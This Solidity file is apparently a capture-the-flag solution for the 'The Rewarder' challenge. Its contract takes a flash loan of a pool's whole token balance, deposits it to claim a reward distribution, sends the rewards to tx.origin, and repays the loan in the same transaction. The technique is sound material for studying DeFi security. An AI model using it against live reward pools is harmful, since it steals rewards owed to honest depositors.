// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";

contract Exploiter {
    FlashLoanerPool private immutable flashLoanPool;
    TheRewarderPool private immutable theRewarderPool;
    RewardToken public immutable rewardToken;

    constructor(address _flashLoanPoolAddress, address _theRewarderPoolAddress) {
        flashLoanPool = FlashLoanerPool(_flashLoanPoolAddress);
        theRewarderPool = TheRewarderPool(_theRewarderPoolAddress);
        rewardToken = theRewarderPool.rewardToken();
    }

    function receiveFlashLoan(uint256 amount) external {
        DamnValuableToken token = DamnValuableToken(address(flashLoanPool.liquidityToken()));
        token.approve(address(theRewarderPool), amount);
        theRewarderPool.deposit(amount);
        uint256 rewards = theRewarderPool.distributeRewards();
        rewardToken.transfer(tx.origin, rewards);
        theRewarderPool.withdraw(amount);
        token.transfer(address(flashLoanPool), amount);
    }

    function attack() external {
        DamnValuableToken token = DamnValuableToken(address(flashLoanPool.liquidityToken()));
        flashLoanPool.flashLoan(token.balanceOf(address(flashLoanPool)));
    }
}
